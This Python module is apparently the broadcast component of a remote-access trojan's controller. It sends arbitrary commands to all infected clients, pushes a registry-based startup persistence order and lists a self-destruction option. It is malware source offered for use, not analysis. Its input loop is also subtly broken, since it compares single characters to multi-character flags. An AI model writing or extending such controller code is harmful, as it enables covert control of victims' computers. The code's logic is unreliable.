from .handler import Handler

from .other import printColor
from .other import XOREncryption
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT

from .management import CheckConn

class Broadcast:

    checker = True

    def __init__(self):
        Broadcast.checker = True

    def help(self):
        '''-h or --help'''
        printColor("help","""
-h or --help : Displays all session mode commands.

-c : Executes a command on all clients and does not send the result (don't forget to put the command in quotation marks). 

-p or --persistence : Makes all clients persistent at startup by modifying the registry keys.

--destruction : Removes all clients on all clients and cuts connections.

-b or --back : Back to menu.
""") 

    
    def executeCommand(self,cmd_list):
        '''-c'''
       # print("-->",cmd_list)
        print("\n")
        cmd_list.pop(0) #delete "-c"
        
        tmp_cmd = " ".join(cmd_list) #list to string
        cmd = ""

        for char in tmp_cmd: 
            if(char == "\""): #remove "
                #print("char detect: ",char)
                pass
            elif(char == " "): #if space
               # print("space")
                cmd += " "
            else:
                cmd += char
        
        self.broadcast_to_all_clients(cmd) #send command for all client



    def broadcast_to_all_clients(self, data, persistence=False): #A CHANGER !!!!!! persistence=False (c'est pour la persistance et la destruction !)
        '''
        Note:
        Sends an order to all customers. 
        persistence=False avoids additional code.
        When sending persistence to all clients, it does not send "MOD_ALL". 
        With the "broadcast" argument of the MOD_PERSISTENCE the client does not send a response. Just it executes persistence. 
        '''

        request = ""
        if not(persistence): 
            request = "MOD_ALL:"+data
        else:
            print("GO TO SEND PERSISTENCE BB")
            request = data

        for key in Handler.dict_conn.keys():
            if(Handler.dict_conn[key][NB_ALIVE]):
                if CheckConn().sendsafe(key,Handler.dict_conn[key][NB_SOCKET], request):
                    printColor("information","[+] command sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
                else:
                    printColor("information","[+] The command could not be sent to: {}:{}".format(Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT]))
            else:
                pass


    def main(self):
        if len(Handler.dict_conn) != 0:
            printColor("information","[?] In MOD_BROADCAST")
            printColor("help","[?] Execute -b or --back to return to sessions mode.\n") 
            
            while Broadcast.checker:
                forall = str(input("broadcast>"))
                printColor("help","[?] Command execute: {}\n".format(forall))
                
                for i in range(len(forall)):

                    if(forall[i] == "--back" or forall[i] == "-b"):
                        Broadcast.checker = False #Break Broadcast
                        break
                   
                    elif(forall[i] == "--destruction"):
                        pass
                    
                    elif(forall[i] == "--persistence"):
                        self.broadcast_to_all_clients("MOD_PERSISTENCE:broadcast",True)
                    
                    elif(forall[i] == "-c"):
                        self.executeCommand(forall)
                    
                    else:
                        pass


                print("\n")
        else:
            printColor("error","[+] No connection is enabled.\n")
        
        printColor("information", "[-] In MOD_MAIN\n")
